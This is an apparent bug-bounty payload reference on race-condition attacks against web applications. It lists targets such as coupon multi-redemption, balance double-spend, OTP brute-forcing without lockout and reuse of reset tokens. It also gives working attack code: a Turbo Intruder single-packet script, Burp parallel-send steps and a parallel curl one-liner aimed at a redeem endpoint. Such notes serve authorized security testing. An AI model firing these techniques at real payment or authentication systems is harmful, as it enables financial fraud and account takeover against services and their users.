---
title: "Payloads: Race Conditions"
type: payloads
tags: [payloads, race-condition, business-logic, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-11-09
---

# Payloads: Race Conditions

Concurrent requests to break a limit or state check (OWASP A04). Routed via the `hunt-bizlogic` skill. See [[techniques/web/race-conditions]].

## Targets (limit-overrun / TOCTOU)
```
redeem a coupon / gift card N times in parallel
withdraw / transfer balance twice (double-spend)
exceed a per-account quota, vote/like/rate-limit, invite limit
apply discount + place order simultaneously
OTP/2FA brute without lockout; password-reset token reuse
"single-use" link / one-time action used multiple times
multi-step state: submit step N while N-1 is mid-processing
```

## How to fire (near-simultaneous)
```
Burp Repeater: select requests -> "Send group in parallel (single-packet attack)"   # HTTP/2: ~20-30 reqs, 1 packet
Turbo Intruder: race-single-packet-attack.py  (gate -> openGate -> all hit together)
```
```python
# Turbo Intruder single-packet race
engine = RequestEngine(endpoint=target, concurrentConnections=1, engine=Engine.BURP2)
for i in range(30): engine.queue(request, gate='race1')
engine.openGate('race1')
```
```bash
# quick-and-dirty parallel curl
seq 30 | xargs -P30 -I_ curl -s -X POST https://t/redeem -d 'code=ABC' -b 'session=...'
```

## Confirm
```
result > expected single-request outcome:
  2x balance credited, coupon used 3x, quota 11/10, 2 accounts from one invite
```

## Real-world
Single-packet-attack races (Kettle, 2023) reliably defeat HTTP/2 backends: gift-card/coupon multi-redeem, balance double-spend, and OTP-brute-without-lockout are repeated high-impact findings on payment/auth flows.

## NEW 2025-2026

- Single-packet attack (last-byte synchronization) is now the DEFAULT probe:
  one TCP packet carries N requests; the server processes them before any
  mutex window. Turbo Intruder / Burp Beta race engine. Multi-endpoint
  alignment (email-change + password-reset) supported by the same engine.
- High-value 2025-26 race surfaces: auth flows (login+MFA, reset+login),
  coupon/credit apply, follow+unfollow, invite-accept twice, transfer+cancel,
  OTP verify (batched GraphQL mutations ride the same window).
- Negative-control discipline: race the same pair on an endpoint KNOWN safe
  (a 409-conflicting one) to prove the harness aligns - else a miss is a
  tooling artifact, not a target property.
